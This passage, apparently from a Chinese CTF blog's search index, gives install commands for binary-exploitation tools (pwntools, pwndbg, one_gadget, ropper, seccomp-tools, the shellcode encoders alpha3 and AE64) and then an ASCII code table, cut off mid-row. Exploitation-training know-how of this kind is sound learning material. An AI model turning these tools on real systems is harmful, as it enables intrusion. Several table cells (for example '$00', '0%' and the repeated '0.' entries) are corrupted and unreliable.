python='/usr/bin/python3'\n```\n\n一般只需要python3，如果需要python2的话可以看：\n\n[python2环境](/docx/python2%E7%8E%AF%E5%A2%83/)\n\n按照这样安装一轮应该就可以了，不要乱删东西。如果不想安装pip可以试下面的第二种办法安装pwntools\n\n## Pwntools\npython库\n\n```plain\nsudo pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple\n#或者\nsudo apt install python3-pwntools\n```\n\n## Wine\n用来在linux环境下使用windows程序的...一般而言不需要\n\n```plain\napt-get install wine\n```\n\n## Gdb & pwndbg\n调试程序\n\n```plain\napt install gdb\napt install git\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n\nvim ~/.gdbinit\n#进入到vim之后，输入人source [pwndbg的位置]/gdbinit.py\n#比如:source /home/kanyo/pwndbg/gdbinit.py\n```\n\n## One_gadget\n一种工具，从libc中直接找到一个构造ROP的地址。\n\n```plain\napt install ruby\napt install gem\ngem install one_gadget\n\npip3 install --break-system-packages ropper #我建议用这个\n```\n\n因为ROPgadget需要用grep管道指令搜索，有点麻烦\n\n可以直接用ropper来查询\n\n```plain\nropper --file [filename] --search '[words]'\n```\n\n## LibcSearcher\n```plain\n#libcSearcher有时候不会准，这里提供一个网站：\n#http://libc.blukat.me\n#下面是libc安装\n\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\npython setup.py develop\n```\n\n## main_arena_offset\n堆题\n\n```plain\nhttps://github.com/bash-c/main_arena_offset\n#shell脚本，直接下载使用即可，用来搜索堆偏移量的\n\nhttps://github.com/zarkivy/py_main_arena_offset\n#这个是python包装好的，内核还是上面的shell脚本，不过可以在python里面使用\n```\n\n## seccomp-tools\n用来查被禁用的syscall的\n\n```plain\nsudo apt install gcc ruby-dev #依赖\nsudo gem install seccomp-tools\n```\n\n## 其他常用\n```plain\napt install vim\napt install checksec\n```\n\n## IDA Pro\nwindows下直接安装即可\n\n\n\n## alpha3.git\n这个软件是用来shellcode字符化的，但是真的他妈的太难用了。\n\n看这个吧：[alpha3.py](/docx/alpha3.py/)\n\n\n\n## AE64\nalpha3对32位的shellcode适配性比较高，不过我们可以试试这个AE64来写64位的题目：\n\n```python\ngit clone https://github.com/veritas501/ae64.git --depth 1\ncd ae64\nsudo python3 setup.py install\n```\n\n","tags":["计算机原理","PWN攻略-前提"],"categories":["PWN不出来"]},{"title":"ASCII码","url":"//docx/ASCII码/","content":"| **<font style=\"color:#444444;\">二进制</font>** | **<font style=\"color:#444444;\">八进制</font>** | **<font style=\"color:#444444;\">十进制</font>** | **<font style=\"color:#444444;\">十六进制</font>** | **<font style=\"color:#444444;\">字符/缩写</font>** | **<font style=\"color:#444444;\">解释</font>** |\n| --- | --- | --- | --- | --- | --- |\n| <font style=\"color:#444444;\">0.</font> | <font style=\"color:#444444;\">0.</font> | <font style=\"color:#444444;\">0.</font> | <font style=\"color:#444444;\">0.</font> | <font style=\"color:#444444;\">NUL (NULL)</font> | <font style=\"color:#444444;\">空字符</font> |\n| <font style=\"color:#444444;\">1.</font> | <font style=\"color:#444444;\">1.</font> | <font style=\"color:#444444;\">1.</font> | <font style=\"color:#444444;\">1.</font> | <font style=\"color:#444444;\">SOH (Start Of Headling)</font> | <font style=\"color:#444444;\">标题开始</font> |\n| <font style=\"color:#444444;\">10.</font> | <font style=\"color:#444444;\">2.</font> | <font style=\"color:#444444;\">2.</font> | <font style=\"color:#444444;\">2.</font> | <font style=\"color:#444444;\">STX (Start Of Text)</font> | <font style=\"color:#444444;\">正文开始</font> |\n| <font style=\"color:#444444;\">11.</font> | <font style=\"color:#444444;\">3.</font> | <font style=\"color:#444444;\">3.</font> | <font style=\"color:#444444;\">3.</font> | <font style=\"color:#444444;\">ETX (End Of Text)</font> | <font style=\"color:#444444;\">正文结束</font> |\n| <font style=\"color:#444444;\">100.</font> | <font style=\"color:#444444;\">4.</font> | <font style=\"color:#444444;\">4.</font> | <font style=\"color:#444444;\">4.</font> | <font style=\"color:#444444;\">EOT (End Of Transmission)</font> | <font style=\"color:#444444;\">传输结束</font> |\n| <font style=\"color:#444444;\">101.</font> | <font style=\"color:#444444;\">5.</font> | <font style=\"color:#444444;\">5.</font> | <font style=\"color:#444444;\">5.</font> | <font style=\"color:#444444;\">ENQ (Enquiry)</font> | <font style=\"color:#444444;\">请求</font> |\n| <font style=\"color:#444444;\">110.</font> | <font style=\"color:#444444;\">6.</font> | <font style=\"color:#444444;\">6.</font> | <font style=\"color:#444444;\">6.</font> | <font style=\"color:#444444;\">ACK (Acknowledge)</font> | <font style=\"color:#444444;\">回应/响应/收到通知</font> |\n| <font style=\"color:#444444;\">111.</font> | <font style=\"color:#444444;\">7.</font> | <font style=\"color:#444444;\">7.</font> | <font style=\"color:#444444;\">7.</font> | <font style=\"color:#444444;\">BEL (Bell)</font> | <font style=\"color:#444444;\">响铃</font> |\n| <font style=\"color:#444444;\">1000.</font> | <font style=\"color:#444444;\">10.</font> | <font style=\"color:#444444;\">8.</font> | <font style=\"color:#444444;\">8.</font> | <font style=\"color:#444444;\">BS (Backspace)</font> | <font style=\"color:#444444;\">退格</font> |\n| <font style=\"color:#444444;\">1001.</font> | <font style=\"color:#444444;\">11.</font> | <font style=\"color:#444444;\">9.</font> | <font style=\"color:#444444;\">9.</font> | <font style=\"color:#444444;\">HT (Horizontal Tab)</font> | <font style=\"color:#444444;\">水平制表符</font> |\n| <font style=\"color:#444444;\">1010.</font> | <font style=\"color:#444444;\">12.</font> | <font style=\"color:#444444;\">10.</font> | <font style=\"color:#444444;\">0A</font> | <font style=\"color:#444444;\">LF/NL(Line Feed/New Line)</font> | <font style=\"color:#444444;\">换行键</font> |\n| <font style=\"color:#444444;\">1011.</font> | <font style=\"color:#444444;\">13.</font> | <font style=\"color:#444444;\">11.</font> | <font style=\"color:#444444;\">0B</font> | <font style=\"color:#444444;\">VT (Vertical Tab)</font> | <font style=\"color:#444444;\">垂直制表符</font> |\n| <font style=\"color:#444444;\">1100.</font> | <font style=\"color:#444444;\">14.</font> | <font style=\"color:#444444;\">12.</font> | <font style=\"color:#444444;\">0C</font> | <font style=\"color:#444444;\">FF/NP (Form Feed/New Page)</font> | <font style=\"color:#444444;\">换页键</font> |\n| <font style=\"color:#444444;\">1101.</font> | <font style=\"color:#444444;\">15.</font> | <font style=\"color:#444444;\">13.</font> | <font style=\"color:#444444;\">0D</font> | <font style=\"color:#444444;\">CR (Carriage Return)</font> | <font style=\"color:#444444;\">回车键</font> |\n| <font style=\"color:#444444;\">1110.</font> | <font style=\"color:#444444;\">16.</font> | <font style=\"color:#444444;\">14.</font> | <font style=\"color:#444444;\">0E</font> | <font style=\"color:#444444;\">SO (Shift Out)</font> | <font style=\"color:#444444;\">不用切换</font> |\n| <font style=\"color:#444444;\">1111.</font> | <font style=\"color:#444444;\">17.</font> | <font style=\"color:#444444;\">15.</font> | <font style=\"color:#444444;\">0F</font> | <font style=\"color:#444444;\">SI (Shift In)</font> | <font style=\"color:#444444;\">启用切换</font> |\n| <font style=\"color:#444444;\">10000.</font> | <font style=\"color:#444444;\">20.</font> | <font style=\"color:#444444;\">16.</font> | <font style=\"color:#444444;\">10.</font> | <font style=\"color:#444444;\">DLE (Data Link Escape)</font> | <font style=\"color:#444444;\">数据链路转义</font> |\n| <font style=\"color:#444444;\">10001.</font> | <font style=\"color:#444444;\">21.</font> | <font style=\"color:#444444;\">17.</font> | <font style=\"color:#444444;\">11.</font> | <font style=\"color:#444444;\">DC1/XON   </font><font style=\"color:#444444;\">(Device Control 1/Transmission On)</font> | <font style=\"color:#444444;\">设备控制1/传输开始</font> |\n| <font style=\"color:#444444;\">10010.</font> | <font style=\"color:#444444;\">22.</font> | <font style=\"color:#444444;\">18.</font> | <font style=\"color:#444444;\">12.</font> | <font style=\"color:#444444;\">DC2 (Device Control 2)</font> | <font style=\"color:#444444;\">设备控制2</font> |\n| <font style=\"color:#444444;\">10011.</font> | <font style=\"color:#444444;\">23.</font> | <font style=\"color:#444444;\">19.</font> | <font style=\"color:#444444;\">13.</font> | <font style=\"color:#444444;\">DC3/XOFF   </font><font style=\"color:#444444;\">(Device Control 3/Transmission Off)</font> | <font style=\"color:#444444;\">设备控制3/传输中断</font> |\n| <font style=\"color:#444444;\">10100.</font> | <font style=\"color:#444444;\">24.</font> | <font style=\"color:#444444;\">20.</font> | <font style=\"color:#444444;\">14.</font> | <font style=\"color:#444444;\">DC4 (Device Control 4)</font> | <font style=\"color:#444444;\">设备控制4</font> |\n| <font style=\"color:#444444;\">10101.</font> | <font style=\"color:#444444;\">25.</font> | <font style=\"color:#444444;\">21.</font> | <font style=\"color:#444444;\">15.</font> | <font style=\"color:#444444;\">NAK (Negative Acknowledge)</font> | <font style=\"color:#444444;\">无响应/非正常响应/拒绝接收</font> |\n| <font style=\"color:#444444;\">10110.</font> | <font style=\"color:#444444;\">26.</font> | <font style=\"color:#444444;\">22.</font> | <font style=\"color:#444444;\">16.</font> | <font style=\"color:#444444;\">SYN (Synchronous Idle)</font> | <font style=\"color:#444444;\">同步空闲</font> |\n| <font style=\"color:#444444;\">10111.</font> | <font style=\"color:#444444;\">27.</font> | <font style=\"color:#444444;\">23.</font> | <font style=\"color:#444444;\">17.</font> | <font style=\"color:#444444;\">ETB (End of Transmission Block)</font> | <font style=\"color:#444444;\">传输块结束/块传输终止</font> |\n| <font style=\"color:#444444;\">11000.</font> | <font style=\"color:#444444;\">30.</font> | <font style=\"color:#444444;\">24.</font> | <font style=\"color:#444444;\">18.</font> | <font style=\"color:#444444;\">CAN (Cancel)</font> | <font style=\"color:#444444;\">取消</font> |\n| <font style=\"color:#444444;\">11001.</font> | <font style=\"color:#444444;\">31.</font> | <font style=\"color:#444444;\">25.</font> | <font style=\"color:#444444;\">19.</font> | <font style=\"color:#444444;\">EM (End of Medium)</font> | <font style=\"color:#444444;\">已到介质末端/介质存储已满/介质中断</font> |\n| <font style=\"color:#444444;\">11010.</font> | <font style=\"color:#444444;\">32.</font> | <font style=\"color:#444444;\">26.</font> | <font style=\"color:#444444;\">1A</font> | <font style=\"color:#444444;\">SUB (Substitute)</font> | <font style=\"color:#444444;\">替补/替换</font> |\n| <font style=\"color:#444444;\">11011.</font> | <font style=\"color:#444444;\">33.</font> | <font style=\"color:#444444;\">27.</font> | <font style=\"color:#444444;\">1B</font> | <font style=\"color:#444444;\">ESC (Escape)</font> | <font style=\"color:#444444;\">逃离/取消</font> |\n| <font style=\"color:#444444;\">11100.</font> | <font style=\"color:#444444;\">34.</font> | <font style=\"color:#444444;\">28.</font> | <font style=\"color:#444444;\">1C</font> | <font style=\"color:#444444;\">FS (File Separator)</font> | <font style=\"color:#444444;\">文件分割符</font> |\n| <font style=\"color:#444444;\">11101.</font> | <font style=\"color:#444444;\">35.</font> | <font style=\"color:#444444;\">29.</font> | <font style=\"color:#444444;\">1D</font> | <font style=\"color:#444444;\">GS (Group Separator)</font> | <font style=\"color:#444444;\">组分隔符/分组符</font> |\n| <font style=\"color:#444444;\">11110.</font> | <font style=\"color:#444444;\">36.</font> | <font style=\"color:#444444;\">30.</font> | <font style=\"color:#444444;\">1E</font> | <font style=\"color:#444444;\">RS (Record Separator)</font> | <font style=\"color:#444444;\">记录分离符</font> |\n| <font style=\"color:#444444;\">11111.</font> | <font style=\"color:#444444;\">37.</font> | <font style=\"color:#444444;\">31.</font> | <font style=\"color:#444444;\">1F</font> | <font style=\"color:#444444;\">US (Unit Separator)</font> | <font style=\"color:#444444;\">单元分隔符</font> |\n| <font style=\"color:#444444;\">100000.</font> | <font style=\"color:#444444;\">40.</font> | <font style=\"color:#444444;\">32.</font> | <font style=\"color:#444444;\">20.</font> | <font style=\"color:#444444;\">(Space)</font> | <font style=\"color:#444444;\">空格</font> |\n| <font style=\"color:#444444;\">100001.</font> | <font style=\"color:#444444;\">41.</font> | <font style=\"color:#444444;\">33.</font> | <font style=\"color:#444444;\">21.</font> | <font style=\"color:#444444;\">!</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">100010.</font> | <font style=\"color:#444444;\">42.</font> | <font style=\"color:#444444;\">34.</font> | <font style=\"color:#444444;\">22.</font> | <font style=\"color:#444444;\">\"</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">100011.</font> | <font style=\"color:#444444;\">43.</font> | <font style=\"color:#444444;\">35.</font> | <font style=\"color:#444444;\">23.</font> | <font style=\"color:#444444;\">#</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">100100.</font> | <font style=\"color:#444444;\">44.</font> | <font style=\"color:#444444;\">36.</font> | <font style=\"color:#444444;\">24.</font> | <font style=\"color:#444444;\">$00</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">100101.</font> | <font style=\"color:#444444;\">45.</font> | <font style=\"color:#444444;\">37.</font> | <font style=\"color:#444444;\">25.</font> | <font style=\"color:#444444;\">0%</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">100110.</font> | <font style=\"color:#444444;\">46.</font> | <font style=\"color:#444444;\">38.</font> | <font style=\"color:#444444;\">26.</font> | <font style=\"color:#444444;\">&</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">100111.</font> | <font style=\"color:#444444;\">47.</font> | <font style=\"color:#444444;\">39.</font> | <font style=\"color:#444444;\">27.</font> | <font style=\"color:#444444;\">'</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101000.</font> | <font style=\"color:#444444;\">50.</font> | <font style=\"color:#444444;\">40.</font> | <font style=\"color:#444444;\">28.</font> | <font style=\"color:#444444;\">(</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101001.</font> | <font style=\"color:#444444;\">51.</font> | <font style=\"color:#444444;\">41.</font> | <font style=\"color:#444444;\">29.</font> | <font style=\"color:#444444;\">)</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101010.</font> | <font style=\"color:#444444;\">52.</font> | <font style=\"color:#444444;\">42.</font> | <font style=\"color:#444444;\">2A</font> | <font style=\"color:#444444;\">*</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101011.</font> | <font style=\"color:#444444;\">53.</font> | <font style=\"color:#444444;\">43.</font> | <font style=\"color:#444444;\">2B</font> | <font style=\"color:#444444;\">+</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101100.</font> | <font style=\"color:#444444;\">54.</font> | <font style=\"color:#444444;\">44.</font> | <font style=\"color:#444444;\">2C</font> | <font style=\"color:#444444;\">,</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101101.</font> | <font style=\"color:#444444;\">55.</font> | <font style=\"color:#444444;\">45.</font> | <font style=\"color:#444444;\">2D</font> | <font style=\"color:#444444;\">-</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101110.</font> | <font style=\"color:#444444;\">56.</font> | <font style=\"color:#444444;\">46.</font> | <font style=\"color:#444444;\">2E</font> | <font style=\"color:#444444;\">.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">101111.</font> | <font style=\"color:#444444;\">57.</font> | <font style=\"color:#444444;\">47.</font> | <font style=\"color:#444444;\">2F</font> | <font style=\"color:#444444;\">/</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110000.</font> | <font style=\"color:#444444;\">60.</font> | <font style=\"color:#444444;\">48.</font> | <font style=\"color:#444444;\">30.</font> | <font style=\"color:#444444;\">0.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110001.</font> | <font style=\"color:#444444;\">61.</font> | <font style=\"color:#444444;\">49.</font> | <font style=\"color:#444444;\">31.</font> | <font style=\"color:#444444;\">1.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110010.</font> | <font style=\"color:#444444;\">62.</font> | <font style=\"color:#444444;\">50.</font> | <font style=\"color:#444444;\">32.</font> | <font style=\"color:#444444;\">2.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110011.</font> | <font style=\"color:#444444;\">63.</font> | <font style=\"color:#444444;\">51.</font> | <font style=\"color:#444444;\">33.</font> | <font style=\"color:#444444;\">3.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110100.</font> | <font style=\"color:#444444;\">64.</font> | <font style=\"color:#444444;\">52.</font> | <font style=\"color:#444444;\">34.</font> | <font style=\"color:#444444;\">4.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110101.</font> | <font style=\"color:#444444;\">65.</font> | <font style=\"color:#444444;\">53.</font> | <font style=\"color:#444444;\">35.</font> | <font style=\"color:#444444;\">5.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110110.</font> | <font style=\"color:#444444;\">66.</font> | <font style=\"color:#444444;\">54.</font> | <font style=\"color:#444444;\">36.</font> | <font style=\"color:#444444;\">6.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">110111.</font> | <font style=\"color:#444444;\">67.</font> | <font style=\"color:#444444;\">55.</font> | <font style=\"color:#444444;\">37.</font> | <font style=\"color:#444444;\">7.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111000.</font> | <font style=\"color:#444444;\">70.</font> | <font style=\"color:#444444;\">56.</font> | <font style=\"color:#444444;\">38.</font> | <font style=\"color:#444444;\">8.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111001.</font> | <font style=\"color:#444444;\">71.</font> | <font style=\"color:#444444;\">57.</font> | <font style=\"color:#444444;\">39.</font> | <font style=\"color:#444444;\">9.</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111010.</font> | <font style=\"color:#444444;\">72.</font> | <font style=\"color:#444444;\">58.</font> | <font style=\"color:#444444;\">3A</font> | <font style=\"color:#444444;\">:</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111011.</font> | <font style=\"color:#444444;\">73.</font> | <font style=\"color:#444444;\">59.</font> | <font style=\"color:#444444;\">3B</font> | <font style=\"color:#444444;\">;</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111100.</font> | <font style=\"color:#444444;\">74.</font> | <font style=\"color:#444444;\">60.</font> | <font style=\"color:#444444;\">3C</font> | <font style=\"color:#444444;\"><</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111101.</font> | <font style=\"color:#444444;\">75.</font> | <font style=\"color:#444444;\">61.</font> | <font style=\"color:#444444;\">3D</font> | <font style=\"color:#444444;\">=</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111110.</font> | <font style=\"color:#444444;\">76.</font> | <font style=\"color:#444444;\">62.</font> | <font style=\"color:#444444;\">3E</font> | <font style=\"color:#444444;\">></font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">111111.</font> | <font style=\"color:#444444;\">77.</font> | <font style=\"color:#444444;\">63.</font> | <font style=\"color:#444444;\">3F</font> | <font style=\"color:#444444;\">?</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000000.</font> | <font style=\"color:#444444;\">100.</font> | <font style=\"color:#444444;\">64.</font> | <font style=\"color:#444444;\">40.</font> | <font style=\"color:#444444;\">@</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000001.</font> | <font style=\"color:#444444;\">101.</font> | <font style=\"color:#444444;\">65.</font> | <font style=\"color:#444444;\">41.</font> | <font style=\"color:#444444;\">A</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000010.</font> | <font style=\"color:#444444;\">102.</font> | <font style=\"color:#444444;\">66.</font> | <font style=\"color:#444444;\">42.</font> | <font style=\"color:#444444;\">B</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000011.</font> | <font style=\"color:#444444;\">103.</font> | <font style=\"color:#444444;\">67.</font> | <font style=\"color:#444444;\">43.</font> | <font style=\"color:#444444;\">C</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000100.</font> | <font style=\"color:#444444;\">104.</font> | <font style=\"color:#444444;\">68.</font> | <font style=\"color:#444444;\">44.</font> | <font style=\"color:#444444;\">D</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000101.</font> | <font style=\"color:#444444;\">105.</font> | <font style=\"color:#444444;\">69.</font> | <font style=\"color:#444444;\">45.</font> | <font style=\"color:#444444;\">E</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000110.</font> | <font style=\"color:#444444;\">106.</font> | <font style=\"color:#444444;\">70.</font> | <font style=\"color:#444444;\">46.</font> | <font style=\"color:#444444;\">F</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1000111.</font> | <font style=\"color:#444444;\">107.</font> | <font style=\"color:#444444;\">71.</font> | <font style=\"color:#444444;\">47.</font> | <font style=\"color:#444444;\">G</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001000.</font> | <font style=\"color:#444444;\">110.</font> | <font style=\"color:#444444;\">72.</font> | <font style=\"color:#444444;\">48.</font> | <font style=\"color:#444444;\">H</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001001.</font> | <font style=\"color:#444444;\">111.</font> | <font style=\"color:#444444;\">73.</font> | <font style=\"color:#444444;\">49.</font> | <font style=\"color:#444444;\">I</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001010.</font> | <font style=\"color:#444444;\">112.</font> | <font style=\"color:#444444;\">74.</font> | <font style=\"color:#444444;\">4A</font> | <font style=\"color:#444444;\">J</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001011.</font> | <font style=\"color:#444444;\">113.</font> | <font style=\"color:#444444;\">75.</font> | <font style=\"color:#444444;\">4B</font> | <font style=\"color:#444444;\">K</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001100.</font> | <font style=\"color:#444444;\">114.</font> | <font style=\"color:#444444;\">76.</font> | <font style=\"color:#444444;\">4C</font> | <font style=\"color:#444444;\">L</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001101.</font> | <font style=\"color:#444444;\">115.</font> | <font style=\"color:#444444;\">77.</font> | <font style=\"color:#444444;\">4D</font> | <font style=\"color:#444444;\">M</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001110.</font> | <font style=\"color:#444444;\">116.</font> | <font style=\"color:#444444;\">78.</font> | <font style=\"color:#444444;\">4E</font> | <font style=\"color:#444444;\">N</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1001111.</font> | <font style=\"color:#444444;\">117.</font> | <font style=\"color:#444444;\">79.</font> | <font style=\"color:#444444;\">4F</font> | <font style=\"color:#444444;\">O</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010000.</font> | <font style=\"color:#444444;\">120.</font> | <font style=\"color:#444444;\">80.</font> | <font style=\"color:#444444;\">50.</font> | <font style=\"color:#444444;\">P</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010001.</font> | <font style=\"color:#444444;\">121.</font> | <font style=\"color:#444444;\">81.</font> | <font style=\"color:#444444;\">51.</font> | <font style=\"color:#444444;\">Q</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010010.</font> | <font style=\"color:#444444;\">122.</font> | <font style=\"color:#444444;\">82.</font> | <font style=\"color:#444444;\">52.</font> | <font style=\"color:#444444;\">R</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010011.</font> | <font style=\"color:#444444;\">123.</font> | <font style=\"color:#444444;\">83.</font> | <font style=\"color:#444444;\">53.</font> | <font style=\"color:#444444;\">S</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010100.</font> | <font style=\"color:#444444;\">124.</font> | <font style=\"color:#444444;\">84.</font> | <font style=\"color:#444444;\">54.</font> | <font style=\"color:#444444;\">T</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010101.</font> | <font style=\"color:#444444;\">125.</font> | <font style=\"color:#444444;\">85.</font> | <font style=\"color:#444444;\">55.</font> | <font style=\"color:#444444;\">U</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010110.</font> | <font style=\"color:#444444;\">126.</font> | <font style=\"color:#444444;\">86.</font> | <font style=\"color:#444444;\">56.</font> | <font style=\"color:#444444;\">V</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1010111.</font> | <font style=\"color:#444444;\">127.</font> | <font style=\"color:#444444;\">87.</font> | <font style=\"color:#444444;\">57.</font> | <font style=\"color:#444444;\">W</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011000.</font> | <font style=\"color:#444444;\">130.</font> | <font style=\"color:#444444;\">88.</font> | <font style=\"color:#444444;\">58.</font> | <font style=\"color:#444444;\">X</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011001.</font> | <font style=\"color:#444444;\">131.</font> | <font style=\"color:#444444;\">89.</font> | <font style=\"color:#444444;\">59.</font> | <font style=\"color:#444444;\">Y</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011010.</font> | <font style=\"color:#444444;\">132.</font> | <font style=\"color:#444444;\">90.</font> | <font style=\"color:#444444;\">5A</font> | <font style=\"color:#444444;\">Z</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011011.</font> | <font style=\"color:#444444;\">133.</font> | <font style=\"color:#444444;\">91.</font> | <font style=\"color:#444444;\">5B</font> | <font style=\"color:#444444;\">[</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011100.</font> | <font style=\"color:#444444;\">134.</font> | <font style=\"color:#444444;\">92.</font> | <font style=\"color:#444444;\">5C</font> | <font style=\"color:#444444;\">\\</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011101.</font> | <font style=\"color:#444444;\">135.</font> | <font style=\"color:#444444;\">93.</font> | <font style=\"color:#444444;\">5D</font> | <font style=\"color:#444444;\">]</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011110.</font> | <font style=\"color:#444444;\">136.</font> | <font style=\"color:#444444;\">94.</font> | <font style=\"color:#444444;\">5E</font> | <font style=\"color:#444444;\">^</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1011111.</font> | <font style=\"color:#444444;\">137.</font> | <font style=\"color:#444444;\">95.</font> | <font style=\"color:#444444;\">5F</font> | <font style=\"color:#444444;\">_</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100000.</font> | <font style=\"color:#444444;\">140.</font> | <font style=\"color:#444444;\">96.</font> | <font style=\"color:#444444;\">60.</font> | <font style=\"color:#444444;\">`</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100001.</font> | <font style=\"color:#444444;\">141.</font> | <font style=\"color:#444444;\">97.</font> | <font style=\"color:#444444;\">61.</font> | <font style=\"color:#444444;\">a</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100010.</font> | <font style=\"color:#444444;\">142.</font> | <font style=\"color:#444444;\">98.</font> | <font style=\"color:#444444;\">62.</font> | <font style=\"color:#444444;\">b</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100011.</font> | <font style=\"color:#444444;\">143.</font> | <font style=\"color:#444444;\">99.</font> | <font style=\"color:#444444;\">63.</font> | <font style=\"color:#444444;\">c</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100100.</font> | <font style=\"color:#444444;\">144.</font> | <font style=\"color:#444444;\">100.</font> | <font style=\"color:#444444;\">64.</font> | <font style=\"color:#444444;\">d</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100101.</font> | <font style=\"color:#444444;\">145.</font> | <font style=\"color:#444444;\">101.</font> | <font style=\"color:#444444;\">65.</font> | <font style=\"color:#444444;\">e</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100110.</font> | <font style=\"color:#444444;\">146.</font> | <font style=\"color:#444444;\">102.</font> | <font style=\"color:#444444;\">66.</font> | <font style=\"color:#444444;\">f</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1100111.</font> | <font style=\"color:#444444;\">147.</font> | <font style=\"color:#444444;\">103.</font> | <font style=\"color:#444444;\">67.</font> | <font style=\"color:#444444;\">g</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101000.</font> | <font style=\"color:#444444;\">150.</font> | <font style=\"color:#444444;\">104.</font> | <font style=\"color:#444444;\">68.</font> | <font style=\"color:#444444;\">h</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101001.</font> | <font style=\"color:#444444;\">151.</font> | <font style=\"color:#444444;\">105.</font> | <font style=\"color:#444444;\">69.</font> | <font style=\"color:#444444;\">i</font> | <font style=\"color:#444444;\">0.</font> |\n| <font style=\"color:#444444;\">1101010.</font> | <font 